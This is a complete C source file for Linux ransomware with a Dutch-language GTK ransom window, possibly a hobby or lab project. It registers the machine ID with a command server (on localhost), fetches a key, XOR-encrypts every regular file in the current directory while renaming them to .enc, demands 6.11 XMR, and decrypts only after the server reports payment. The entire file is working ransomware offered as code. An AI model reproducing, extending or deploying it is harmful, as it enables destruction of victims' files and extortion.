#include <dirent.h>
#include <gtk/gtk.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <jansson.h>

#define MAX_FILES 100

typedef struct {
  char **filePaths;             // Array of file paths
  FILE **filePointers;          // Array of file pointers
  long *fileSizes;              // Array of file sizes
  unsigned char **fileContents; // Array of file contents
  const char *masterKey;        // Master key
  size_t fileCount;             // Number of files processed
} FileInfo;

FileInfo globalFileInfo;

const char *hasPaidHolder;

void initGlobalFileInfo(const char *masterKey) {
  globalFileInfo.masterKey = masterKey;
  globalFileInfo.fileCount = 0;
  globalFileInfo.filePaths = malloc(MAX_FILES * sizeof(char *));
  globalFileInfo.filePointers = malloc(MAX_FILES * sizeof(FILE *));
  globalFileInfo.fileSizes = malloc(MAX_FILES * sizeof(long));
  globalFileInfo.fileContents = malloc(MAX_FILES * sizeof(unsigned char *));

  if (!globalFileInfo.filePaths || !globalFileInfo.filePointers ||
      !globalFileInfo.fileSizes || !globalFileInfo.fileContents) {
    fprintf(stderr, "Memory allocation failed\n");
    exit(EXIT_FAILURE);
  }
}

void cleanupGlobalFileInfo() {
  for (size_t i = 0; i < globalFileInfo.fileCount; i++) {
    if (globalFileInfo.filePointers[i]) {
      fclose(globalFileInfo.filePointers[i]);
    }
    free(globalFileInfo.filePaths[i]);
    free(globalFileInfo.fileContents[i]);
  }
  free(globalFileInfo.filePaths);
  free(globalFileInfo.filePointers);
  free(globalFileInfo.fileSizes);
  free(globalFileInfo.fileContents);
}

void encrypt(unsigned char *input, const char *key) {
  printf("Encrypting file using key: %s\n", key);
  // loop through the input chars
  for (size_t i = 0; input[i] != '\0'; ++i) {
    input[i] ^= key[i % strlen(key)]; // we XORing that thing with our key
  }
}

void decrypt(unsigned char *input, const char *key) {
  // loop through the input chars
  for (size_t i = 0; input[i] != '\0'; ++i) {
    input[i] ^= key[i % strlen(key)]; // we XORing that thing with our key
  }
}

int isEncrypted(const char *filename) {
  return strstr(filename, ".enc") != NULL;
}

void changeExtension(char *filename, const char *new_ext) {
  char *dot = strrchr(filename, '.');
  if (dot) {
    // If the current extension is .enc, remove it
    if (strcmp(dot, ".enc") == 0) {
      *dot = '\0'; // Removing .enc
    } else {
      // If it's not .enc, replace the existing one with new_ext
      strcat(filename, new_ext); // Add new extension
    }
  } else {
    // No extension present, just add the new extension
    strcat(filename, new_ext);
  }
}

void decryptAfterPayment(const char *filePath, FILE *filePointer,
                         unsigned char *fileContent, long fileSize,
                         const char *masterKey) {
  if (isEncrypted(filePath)) {
    printf("Decrypting File: %s\n", filePath);
    decrypt(fileContent, masterKey);

    // Prepare new file path for decrypted file
    char newFilePath[PATH_MAX];
    strcpy(newFilePath, filePath);
    changeExtension(newFilePath, ""); // Remove the .enc extension

    // Write the modified contents back
    rewind(filePointer);
    fwrite(fileContent, 1, fileSize, filePointer);
    rename(filePath, newFilePath); // Rename to the original name
  }

  // Cleanup
  printf("Finished processing file decrypt: %s\n", filePath);
}

void onButtonClicked(GtkWidget *widget, gpointer data) {
  if (strchr(hasPaidHolder, '0') != NULL) {
    GtkWidget *dialog;
    dialog = gtk_message_dialog_new(NULL, GTK_DIALOG_DESTROY_WITH_PARENT, GTK_MESSAGE_INFO, GTK_BUTTONS_OK, "U heeft nog niet betaald!");

    gtk_dialog_run(GTK_DIALOG(dialog));
    gtk_widget_destroy(dialog);
  } else {
    for (size_t i = 0; i < globalFileInfo.fileCount; i++) {
      printf("in loop number: %i\n", (int)i);
      decryptAfterPayment(globalFileInfo.filePaths[i],
                        globalFileInfo.filePointers[i],
                        globalFileInfo.fileContents[i],
                        globalFileInfo.fileSizes[i], globalFileInfo.masterKey);
    }
    GtkWidget *dialog;
    dialog = gtk_message_dialog_new(NULL, GTK_DIALOG_DESTROY_WITH_PARENT,
                                  GTK_MESSAGE_INFO, GTK_BUTTONS_OK,
                                  "Je bestanden zullen nu decrypt worden!");
    gtk_dialog_run(GTK_DIALOG(dialog));
    gtk_widget_destroy(dialog);
  }
}

void processFile(const char *filePath, const char *masterKey) {
  // Open the file
  FILE *filePointer = fopen(filePath, "rb+");
  if (filePointer == NULL) {
    printf("Unable to open file: %s\n", filePath);
    return;
  }

  // Get file size
  fseek(filePointer, 0, SEEK_END);
  long fileSize = ftell(filePointer);
  fseek(filePointer, 0, SEEK_SET);

  // Allocate memory for fileContents
  unsigned char *fileContent = malloc(fileSize + 1);
  if (fileContent == NULL) {
    printf("Failed to allocate fileContent.\n");
    fclose(filePointer);
    return;
  }

  // Read the files into the buffer
  if (!fread(fileContent, 1, fileSize, filePointer)) printf("fread failed\n");
  fileContent[fileSize] = '\0'; // Null terminator

  if (globalFileInfo.fileCount < MAX_FILES) {
    globalFileInfo.filePaths[globalFileInfo.fileCount] = strdup(filePath);
    globalFileInfo.filePointers[globalFileInfo.fileCount] = filePointer;
    globalFileInfo.fileSizes[globalFileInfo.fileCount] = fileSize;
    globalFileInfo.fileContents[globalFileInfo.fileCount] = fileContent;
    globalFileInfo.fileCount++;
    printf("adding file to globals %i\n", (int)globalFileInfo.fileCount);
  } else {
    printf("Maximum file limit reached.\n");
    free(fileContent);
    fclose(filePointer);
  }

  if (!isEncrypted(filePath)) {
    printf("Encrypting File: %s\n", filePath);
    encrypt(fileContent, masterKey);

    char newFilePath[PATH_MAX];
    strcpy(newFilePath, filePath);
    changeExtension(newFilePath, ".enc"); // Add .enc extension

    rewind(filePointer);
    fwrite(fileContent, 1, fileSize, filePointer);
    rename(filePath, newFilePath); // Rename to the new name
  }

  // Write to file
  rewind(filePointer);
  fwrite(fileContent, 1, fileSize, filePointer);

  // Change file extension
  char newFilePath[PATH_MAX];
  strcpy(newFilePath, filePath);
  if (!isEncrypted(filePath)) {
    // If not encrypted, add .enc extension
    changeExtension(newFilePath, ".enc");
  }

  rename(filePath, newFilePath); // Rename the file
  printf("Finished processing file: %s\n", newFilePath);
}

#define SYS_UUID_PATH "/etc/machine-id"

char* machineId;

void getMachineId() {
#ifdef WIN32
  return;
#else
  char * buffer = 0;
  long length;
  FILE * f = fopen (SYS_UUID_PATH, "rb");

  if (f)
  {
    fseek (f, 0, SEEK_END);
    length = ftell (f);
    fseek (f, 0, SEEK_SET);
    buffer = malloc (length);
    if (buffer)
    {
      if (!fread (buffer, 1, length, f)){
        printf("fread failed");
      }
    }
    fclose (f);
  }

  if (buffer)
  {
    // start to process your data / extract strings here...
    machineId = buffer;
  }
#endif
}

struct MemoryStruct {
  char *memory;
  size_t size;
};

static size_t writeCallBack(void *contents, size_t size, size_t nmemb, void* userPointer) {
  size_t realSize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)userPointer;

  char *pointer = realloc(mem->memory, mem->size + realSize + 1);
  if (!pointer) {
    printf("Not enough memory (realloc returned NULL)\n");
    return 0;
  } 

  mem->memory = pointer;
  memcpy(&(mem->memory[mem->size]), contents, realSize);
  mem->size += realSize;
  mem->memory[mem->size] = 0;

  return realSize;
}

int addClientToServer() {
  CURL *curl;
  CURLcode result;
  long httpResponseCode = 0;

  result = curl_global_init(CURL_GLOBAL_ALL);
  if (result)
      return (int) result;

  curl = curl_easy_init();
  if (curl) {
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:1025/create.php");
    char text[124] = "machineId=";
    strcat(text, machineId);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, text);

    result = curl_easy_perform(curl);

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpResponseCode);

    if (result != CURLE_OK)
      printf("Curl error: %s\n", curl_easy_strerror(result));

    if (httpResponseCode == 409) {
      printf("Client already exists...");
      curl_easy_cleanup(curl);
      return 0;
    }
    curl_easy_cleanup(curl);
  }

  curl_global_cleanup();
  return (int)httpResponseCode;
};

const char *masterKey;
int hasPaid;

int getMasterKey() {
  CURL *curl;
  CURLcode result;
  struct MemoryStruct chunk;
  json_t *root;
  json_error_t error;
  long httpResponseCode = 0;

  result = curl_global_init(CURL_GLOBAL_ALL);
  if (result)
      return (int)result;

  chunk.memory = malloc(1);
  chunk.size = 0;

  curl = curl_easy_init();
  if (curl) {
    //char text[200] = "http://localhost:1025/read.php?machineId=";
    char url[2048];
    char *fixedMachineId = curl_easy_escape(curl, machineId, 0);

    sprintf(url, "http://localhost:1025/read.php?machineId=%s", fixedMachineId);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    //curl_easy_setopt(curl, CURLOPT_POSTFIELDS, text);
    //curl_easy_setopt(curl, CURLOPT_URL, "machineId=test1");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallBack);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-agent/1.0");
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpResponseCode);

    result = curl_easy_perform(curl);

    if (result != CURLE_OK)
      printf("Curl error: %s\n", curl_easy_strerror(result));
    else {
      root = json_loads(chunk.memory, 0, &error);
      //printf("data: %s\n", chunk.memory);
      //free(chunk.memory);

      if (!root) {
        printf("Failed to load json: %s\n", error.text);
      }

      if (json_is_array(root)) {
        for (size_t i = 0; i < json_array_size(root); i++) {
          json_t *data, *key, *hasPaid;
          const char *messageText, *hasPaidString;

          data = json_array_get(root, i);
          if (json_is_object(data)) {
            key = json_object_get(data, "key");
            hasPaid = json_object_get(data, "paid");
            messageText = json_string_value(key);
            hasPaidString = json_string_value(hasPaid);
            printf("paid: %s\n", hasPaidString);
            printf("key: %s\n", messageText);
            masterKey = messageText;
            hasPaidHolder = hasPaidString;
          } else {
            printf("error: on line %d: %s\n", error.line, error.text);
          }
        }
      } else {
        printf("error array: on line %d: %s\n", error.line, error.text);
      }
    }

    curl_easy_cleanup(curl);
  }

  free(chunk.memory);

  curl_global_cleanup();
  return (int)result;
}

int main(int argc, char *argv[]) {
  // struct pointer to dirent header file
  struct dirent *entryPoint;
  // Directory pointer
  DIR *directoryPointer;

  // Directory path (. = current directory)
  const char *directoryPath = ".";
  // our masterkey
  //const char *masterKey = "simplekey";
  //
  
  getMachineId();
  printf("machineid: %s\n", machineId);

  int response = addClientToServer();
  printf("Got response: %i\n", response);
 
  int responseMasterKey = getMasterKey();
  printf("masterkey response: %i\n", responseMasterKey);

  initGlobalFileInfo(masterKey);


  // get path of executable
  char executablePath[PATH_MAX];
  if (!realpath(argv[0], executablePath)) printf("failed to get realpath!");

  gtk_init(&argc, &argv);

  GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
  gtk_window_set_title(GTK_WINDOW(window), "Oh Nee!");
  gtk_window_set_default_size(GTK_WINDOW(window), 300, 150);

  // Create a vertical box container
  GtkWidget *vbox = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
  gtk_container_add(GTK_CONTAINER(window), vbox);

  // Create the label
  GtkWidget *label = gtk_label_new("Oh nee! uw bestanden zijn versleuteld...");
  GtkWidget *label2 =
      gtk_label_new("Om je bestanden te decrypten, stuur dan 6.11XMR naar "
                    "...");
  gtk_box_pack_start(GTK_BOX(vbox), label, FALSE, FALSE, 10);
  gtk_box_pack_start(GTK_BOX(vbox), label2, FALSE, FALSE, 5);

  directoryPointer = opendir(directoryPath);
  if (directoryPointer == NULL) {
    printf("Failed to open directory : %s\n", directoryPath);
    return EXIT_FAILURE;
  }

  while ((entryPoint = readdir(directoryPointer)) != NULL) {
    // print all entries
    printf("Processing file: %s\n", entryPoint->d_name);

    char *filePath = malloc(strlen(directoryPath) + strlen(entryPoint->d_name) +
                            2); // idek what i cooked here

    if (filePath == NULL) {
      printf("Failed to allocate filePath.\n");
      continue;
    }

    sprintf(filePath, "%s/%s", directoryPath, entryPoint->d_name);
    // Get the filename part of filePath
    const char *fileName = strrchr(filePath, '/');
    if (fileName != NULL) {
      fileName++; // move past the '/'
    } else {
      fileName = filePath; // no '/' found, entire string is filename
    }

    // Get the filename of the executable
    const char *execFileName = strrchr(executablePath, '/');
    if (execFileName != NULL) {
      execFileName++;
    } else {
      execFileName = executablePath;
    }

    // Now compare filenames
    if (strcmp(fileName, execFileName) == 0) {
      printf("Skipping ransomware executable: %s\n", filePath);
      free(filePath);
      continue;
    }

    if (entryPoint->d_type == DT_REG) { // Process regular files only
      processFile(filePath, masterKey);
    }
  }

  // Create the button
  GtkWidget *button = gtk_button_new_with_label("Ik heb betaald!");
  g_signal_connect(button, "clicked", G_CALLBACK(onButtonClicked), NULL);
  gtk_widget_set_halign(button, GTK_ALIGN_CENTER);
  gtk_widget_set_size_request(button, 100, -1);
  gtk_box_pack_start(GTK_BOX(vbox), button, FALSE, FALSE, 10);

  g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

  gtk_widget_show_all(window);

  gtk_main();

  // we done
  closedir(directoryPointer);
  cleanupGlobalFileInfo();
  // gtk_main_quit();
  return EXIT_SUCCESS;
}
